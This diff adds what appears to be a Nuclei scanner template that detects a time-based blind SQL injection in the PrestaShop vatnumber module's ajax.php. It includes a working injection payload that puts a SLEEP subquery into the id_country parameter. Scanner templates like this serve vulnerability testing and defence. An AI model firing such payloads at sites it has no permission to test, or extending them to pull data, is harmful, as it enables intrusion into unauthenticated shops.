@@ -1,0 +1,46 @@
+id: vatnumber-sqli
+
+info:
+  name: PrestaShop vatnumber - Time-Based Blind SQL Injection
+  author: acunetix-export
+  severity: critical
+  description: |
+    Module vatnumber for PrestaShop contains time-based blind SQL injection
+    in ajax.php via GET parameter id_country. No authentication required.
+  reference:
+    - https://security.friendsofpresta.org/
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 2
+    framework: prestashop
+    module: vatnumber
+  tags: sqli,prestashop,vatnumber,time-based,blind
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/modules/vatnumber/ajax.php"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403 && duration <= 3'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /modules/vatnumber/ajax.php?id_country=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403'
